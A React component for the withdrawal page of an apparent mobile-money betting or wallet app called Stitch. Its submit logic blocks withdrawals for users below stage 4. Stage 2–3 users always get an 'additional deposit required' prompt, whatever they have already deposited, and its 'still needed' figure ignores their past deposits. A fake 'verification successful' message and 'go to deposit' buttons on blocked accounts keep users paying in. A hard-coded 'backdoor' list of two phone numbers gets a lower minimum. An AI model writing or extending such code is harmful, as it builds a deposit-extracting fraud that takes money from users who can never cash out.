import { useEffect, useRef, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import useMediaQuery from '../../premium/useMediaQuery.js';
import useStitchWallet from '../../premium/useStitchWallet.js';
import { useAccount } from '../../providers/AccountProvider.jsx';
import { StitchFooter, StitchTopNav } from '../../premium/StitchChrome.jsx';
import StitchTxList from '../../premium/StitchTxList.jsx';
import { TabBar } from './StitchMobile.jsx';

/* ---------------------------------------------------------------------------
   Stitch — Withdraw

   A premium port of the legacy withdraw page. The stage gate, 10%
   deposit-ratio rule, per-stage minimums and the backdoor flat minimum are
   preserved exactly (mirrors server config). The final submission calls the
   REAL withdraw() API; the recent list is the real withdrawal history.
   ------------------------------------------------------------------------- */

const NETWORKS = {
  momo:       { label: 'MTN Mobile Money', tag: 'MTN', bg: '#ffcc00' },
  vodafone:   { label: 'Telecel Cash',     tag: 'TLC', bg: '#e60000' },
  airteltigo: { label: 'AT Money',         tag: 'AT',  bg: '#0055ff' },
};

const MIN_WITHDRAW_DEFAULT = 550;
const STAGE2_MIN_WITHDRAW = 10000;
const STAGE3_MIN_WITHDRAW = 40000;
const STAGE4_MIN_WITHDRAW = 50000;
const MAX_WITHDRAW = 95000;
const WITHDRAW_DEPOSIT_RATIO = 0.10;
const REQUIRED_DEPOSIT = 1000;
const FLAT_MIN_WITHDRAW_PHONES = ['0246350785', '0256507252'];

function fmt(n) {
  return Number(n || 0).toLocaleString('en-GH', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

function maskPhone(phone) {
  const raw = String(phone || '').replace(/\D/g, '');
  if (raw.length < 5) return phone || '';
  return `${raw.slice(0, 2)}****${raw.slice(-3)}`;
}

export default function StitchWithdraw() {
  const isMobile = useMediaQuery('(max-width: 1023px)');
  const { account, openDeposit } = useAccount();
  const { withdrawals, withdraw, busy } = useStitchWallet();

  const [amount, setAmount] = useState('');
  const [method, setMethod] = useState('momo');
  const [tab, setTab] = useState('momo');
  const [err, setErr] = useState('');
  const [showDepositReq, setShowDepositReq] = useState(false);
  const [showVerifySuccess, setShowVerifySuccess] = useState(false);
  const [showExtraDeposit, setShowExtraDeposit] = useState(false);
  const [showBlocked, setShowBlocked] = useState(false);
  const [showConfirmWithdraw, setShowConfirmWithdraw] = useState(false);
  const [showPendingRequest, setShowPendingRequest] = useState(false);

  const stageIndex = (() => {
    const s = Number(account?.stage);
    return Number.isFinite(s) ? s : 0;
  })();
  const isBlocked = Boolean(account?.blocked);

  const minWithdrawRef = account?.phone
    || (account?.email && !account.email.includes('@') ? account.email : '');
  const isFlatMinWithdrawAccount = FLAT_MIN_WITHDRAW_PHONES.includes(minWithdrawRef);
  const MIN_WITHDRAW = isFlatMinWithdrawAccount ? MIN_WITHDRAW_DEFAULT : (
    stageIndex === 2 ? STAGE2_MIN_WITHDRAW :
    stageIndex === 3 ? STAGE3_MIN_WITHDRAW :
    stageIndex === 4 ? STAGE4_MIN_WITHDRAW :
    MIN_WITHDRAW_DEFAULT
  );

  const navigate = useNavigate();

  // Guests can't withdraw — send them to sign in and return here.
  useEffect(() => {
    if (!account) navigate('/login?next=/withdraw');
  }, [account, navigate]);

  // Stage 1 → Stage 2 (automatic once lifetime deposits reach GHS 1,000) shows
  // a one-time success popup. A ref keeps a freshly-mounted stage-2 account
  // from re-triggering it.
  const stageRef = useRef(null);
  useEffect(() => {
    if (stageRef.current === null) { stageRef.current = stageIndex; return; }
    if (stageRef.current === 1 && stageIndex === 2) setShowVerifySuccess(true);
    stageRef.current = stageIndex;
  }, [stageIndex]);

  if (!account) return null;

  const balance = Number(account.balance ?? 0);
  const totalDeposited = Number(account.totalDeposited || 0);
  const amtNum = parseFloat(String(amount).replace(/,/g, '')) || 0;
  const overBalance = amtNum > balance;
  const hasValidCents = Math.abs(amtNum * 100 - Math.round(amtNum * 100)) < 1e-6;
  const isAmountValid = amtNum >= MIN_WITHDRAW && amtNum <= MAX_WITHDRAW && !overBalance && hasValidCents;
  const net = NETWORKS[method];
  const accountPhone = account?.phone || (account?.email && !account.email.includes('@') ? account.email : '');

  const bump = (n) => setAmount((cur) => String(Math.min(MAX_WITHDRAW, (parseFloat(cur || 0) + n))));
  const cycleNetwork = () => {
    const order = ['momo', 'vodafone', 'airteltigo'];
    setMethod((cur) => order[(order.indexOf(cur) + 1) % order.length]);
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    if (isBlocked && stageIndex !== 3) { setShowBlocked(true); return; }
    if (stageIndex === 0 || stageIndex === 1) { setShowDepositReq(true); return; }
    if (stageIndex === 2 || stageIndex === 3) {
      const required = Number((amtNum * WITHDRAW_DEPOSIT_RATIO).toFixed(2));
      const depositMet = totalDeposited >= required;
      if (isBlocked && depositMet) { setShowBlocked(true); return; }
      setShowExtraDeposit(true);
      return;
    }
    setShowConfirmWithdraw(true);
  };

  const confirmWithdraw = async () => {
    const res = await withdraw(amtNum, method);
    if (res.ok) {
      setShowConfirmWithdraw(false);
      setShowPendingRequest(true);
      setAmount('');
    } else {
      setShowConfirmWithdraw(false);
      setErr(res.error || 'Withdrawal failed.');
    }
  };

  const goDeposit = () => {
    setShowDepositReq(false);
    setShowExtraDeposit(false);
    setShowBlocked(false);
    openDeposit();
  };
  const goSupport = () => { setShowBlocked(false); navigate('/help'); };

  const extraRequired = Number((amtNum * WITHDRAW_DEPOSIT_RATIO).toFixed(2));
  const extraAvailable = totalDeposited;
  const extraStillNeeded = extraRequired;

  const modals = (
    <>
      {showDepositReq && (
        <div className="stx-modal-overlay" role="dialog" aria-modal="true" aria-labelledby="wd-dep-req" onClick={() => setShowDepositReq(false)}>
          <div className="stx-modal-card" onClick={(e) => e.stopPropagation()}>
            <div className="stx-modal-head">
              <h2 id="wd-dep-req" className="stx-h2">Deposit requirement</h2>
              <button type="button" className="stx-modal-x" aria-label="Close" onClick={() => setShowDepositReq(false)}>×</button>
            </div>
            <p className="stx-body-sm">
              You need to deposit GHS {REQUIRED_DEPOSIT.toLocaleString('en-US')}.00 to your account to verify your account.
            </p>
            <ul className="stx-wlist"><li><span>Required amount</span><b>GHS {REQUIRED_DEPOSIT.toLocaleString('en-US')}.00</b></li></ul>
            <button type="button" className="stx-cta" onClick={goDeposit}>Go to Deposit</button>
          </div>
        </div>
      )}

      {showVerifySuccess && (
        <div className="stx-modal-overlay" role="dialog" aria-modal="true" aria-labelledby="wd-verify" onClick={() => setShowVerifySuccess(false)}>
          <div className="stx-modal-card stx-modal-card--win" onClick={(e) => e.stopPropagation()}>
            <div className="stx-modal-badge">✓</div>
            <h2 id="wd-verify" className="stx-h2" style={{ textAlign: 'center' }}>Account verification successful</h2>
            <p className="stx-body-sm" style={{ textAlign: 'center' }}>
              Your account has been successfully verified and is now fully active. You can now proceed with your withdrawal.
            </p>
            <button type="button" className="stx-cta" onClick={() => setShowVerifySuccess(false)}>Continue to Withdraw</button>
          </div>
        </div>
      )}

      {showExtraDeposit && (
        <div className="stx-modal-overlay" role="dialog" aria-modal="true" aria-labelledby="wd-extra" onClick={() => setShowExtraDeposit(false)}>
          <div className="stx-modal-card" onClick={(e) => e.stopPropagation()}>
            <div className="stx-modal-head">
              <h2 id="wd-extra" className="stx-h2">Additional deposit required</h2>
              <button type="button" className="stx-modal-x" aria-label="Close" onClick={() => setShowExtraDeposit(false)}>×</button>
            </div>
            <ul className="stx-wlist">
              <li><span>Withdrawal amount</span><b>GHS {fmt(amtNum)}</b></li>
              <li><span>Required</span><b>GHS {fmt(extraRequired)}</b></li>
              <li><span>Approved deposits</span><b>GHS {fmt(extraAvailable)}</b></li>
              <li><span>Still needed</span><b>GHS {fmt(extraStillNeeded)}</b></li>
            </ul>
            <button type="button" className="stx-cta" onClick={goDeposit}>Go to Deposit</button>
            <button type="button" className="stx-cta stx-cta--ghost" onClick={() => setShowExtraDeposit(false)}>Later</button>
          </div>
        </div>
      )}

      {showBlocked && (
        <div className="stx-modal-overlay stx-modal-overlay--dark" role="dialog" aria-modal="true" aria-labelledby="wd-blocked" onClick={() => setShowBlocked(false)}>
          <div className="stx-modal-card stx-modal-card--dark" onClick={(e) => e.stopPropagation()}>
            <div className="stx-modal-badge stx-modal-badge--lock">🔒</div>
            <h2 id="wd-blocked" className="stx-h2" style={{ textAlign: 'center' }}>Account blocked</h2>
            <p className="stx-body-sm" style={{ textAlign: 'center' }}>Status: Account blocked</p>
            <button type="button" className="stx-cta" onClick={goDeposit}>Go to Deposit</button>
            <button type="button" className="stx-cta stx-cta--ghost" onClick={goSupport}>Contact Support</button>
            <button type="button" className="stx-cta stx-cta--ghost" onClick={() => setShowBlocked(false)}>Close</button>
          </div>
        </div>
      )}

      {showConfirmWithdraw && (
        <div className="stx-modal-overlay" role="dialog" aria-modal="true" aria-labelledby="wd-confirm" onClick={() => !busy && setShowConfirmWithdraw(false)}>
          <div className="stx-modal-card" onClick={(e) => e.stopPropagation()}>
            <div className="stx-modal-head">
              <h2 id="wd-confirm" className="stx-h2">Confirm to Withdraw</h2>
              <button type="button" className="stx-modal-x" aria-label="Close" disabled={busy} onClick={() => setShowConfirmWithdraw(false)}>×</button>
            </div>
            <ul className="stx-wlist">
              <li><span>Remaining amount</span><b>GHS {fmt(Math.max(0, balance - amtNum))}</b></li>
              <li><span>Withdraw to</span><b>{net.label}</b></li>
              <li><span>Mobile number</span><b>{maskPhone(accountPhone)}</b></li>
              <li><span>Withdrawal amount</span><b>GHS {fmt(amtNum)}</b></li>
            </ul>
            <div className="stx-modal-actions">
              <button type="button" className="stx-cta stx-cta--ghost" disabled={busy} onClick={() => setShowConfirmWithdraw(false)}>Cancel</button>
              <button type="button" className="stx-cta" disabled={busy} onClick={confirmWithdraw}>{busy ? 'Processing…' : 'Confirm'}</button>
            </div>
          </div>
        </div>
      )}

      {showPendingRequest && (
        <div className="stx-modal-overlay" role="dialog" aria-modal="true" aria-labelledby="wd-pending" onClick={() => setShowPendingRequest(false)}>
          <div className="stx-modal-card" onClick={(e) => e.stopPropagation()}>
            <div className="stx-modal-badge stx-modal-badge--pending">⏱</div>
            <h2 id="wd-pending" className="stx-h2" style={{ textAlign: 'center' }}>Pending Request</h2>
            <p className="stx-body-sm" style={{ textAlign: 'center' }}>
              Your withdrawal request has been submitted, awaiting confirmation. You can check the withdrawal records in a short while.
            </p>
            <div className="stx-modal-actions">
              <button type="button" className="stx-cta stx-cta--ghost" onClick={() => setShowPendingRequest(false)}>Close</button>
            </div>
          </div>
        </div>
      )}
    </>
  );

  const content = (
    <>
      <div className="stx-sectionhead">
        <div>
          <h1 className="stx-h1">Withdraw</h1>
          <p className="stx-sub">Cash out to your mobile money.</p>
        </div>
      </div>

      <div className="stx-tabs" role="tablist" aria-label="Withdrawal method">
        {[['momo', 'Mobile Money'], ['card', 'Card']].map(([k, lbl]) => (
          <button
            key={k}
            type="button"
            role="tab"
            aria-selected={tab === k}
            className={`stx-chip${tab === k ? ' stx-chip--on' : ''}`}
            onClick={() => setTab(k)}
          >
            {lbl}
          </button>
        ))}
      </div>

      {tab === 'momo' && (
        <form onSubmit={handleSubmit}>
          <div className="stx-wcard">
            <span className="stx-wrow-label">Mobile number</span>
            <b>{maskPhone(accountPhone) || '—'}</b>
          </div>

          <div className="stx-wrow">
            <span className="stx-net-tag" style={{ background: net.bg }}>{net.tag}</span>
            <b style={{ flex: 1 }}>{net.label}</b>
            <button type="button" className="stx-link" onClick={cycleNetwork}>Switch ›</button>
          </div>

          <div className="stx-wbal">Balance (GHS) {fmt(balance)}</div>

          <div className="stx-wamount">
            <div className="stx-wamount-top">
              <label htmlFor="stx-wd-amt">Amount (GHS)</label>
              <span className="stx-muted">min. {MIN_WITHDRAW.toLocaleString('en-US')}.00</span>
            </div>
            <input
              id="stx-wd-amt"
              type="number"
              min={MIN_WITHDRAW}
              max={MAX_WITHDRAW}
              step="0.01"
              inputMode="decimal"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder={`min. ${MIN_WITHDRAW.toLocaleString('en-US')}`}
              autoFocus
            />
          </div>

          <div className="stx-wchips">
            {[10, 50, 100, 500, 1000].map((n) => (
              <button key={n} type="button" className="stx-chip" onClick={() => bump(n)}>+{n}</button>
            ))}
            <button
              type="button"
              className="stx-chip stx-chip--on"
              disabled={balance < MIN_WITHDRAW}
              onClick={() => setAmount(String(Math.min(MAX_WITHDRAW, Math.floor(balance * 100) / 100)))}
            >
              Max
            </button>
          </div>

          {overBalance && (
            <div className="stx-note stx-note--warn">Insufficient balance — you have GHS {fmt(balance)}.</div>
          )}
          {err && <div className="stx-note stx-note--warn">{err}</div>}

          <button type="submit" className="stx-cta stx-cta--block" disabled={!isAmountValid || busy}>
            {busy ? 'Processing…' : 'Withdraw Now'}
          </button>

          <ol className="stx-wnotes">
            <li>Maximum transaction is GHS {MAX_WITHDRAW.toLocaleString('en-US')}.00</li>
            <li>Minimum per transaction is GHS {MIN_WITHDRAW.toLocaleString('en-US')}.00</li>
            <li>Withdrawal is free, no fee transaction.</li>
          </ol>
        </form>
      )}

      {tab === 'card' && (
        <div className="stx-bets-empty">
          <p className="stx-body-md"><b>Card withdrawals unavailable</b></p>
          <p className="stx-body-sm stx-muted">Switch to Mobile Money to withdraw to your MoMo wallet.</p>
        </div>
      )}

      {tab === 'momo' && (
        <section className="stx-wtx" style={{ marginTop: 24 }}>
          <header className="stx-wtx-head"><h3 className="stx-h3">Recent withdrawals</h3></header>
          <StitchTxList txs={withdrawals} limit={5} empty="No withdrawals yet." />
        </section>
      )}
    </>
  );

  if (isMobile) {
    return (
      <div className="stx">
        <div className="stx-mob">
          <header className="stx-mob-head">
            <span className="stx-brand" style={{ fontSize: 17 }}>Withdraw</span>
            <div className="stx-right">
              <span className="stx-mob-bal"><span>BAL</span> GHS {fmt(balance)}</span>
            </div>
          </header>
          <div className="stx-mob-body"><div className="stx-walletpage">{content}</div></div>
        </div>
        {modals}
        <TabBar current="/wallet" />
      </div>
    );
  }

  return (
    <div className="stx">
      <StitchTopNav slip={{ account, openDeposit }} current="/wallet" />
      <div className="stx-walletpage">{content}</div>
      {modals}
      <StitchFooter current="/wallet" />
    </div>
  );
}
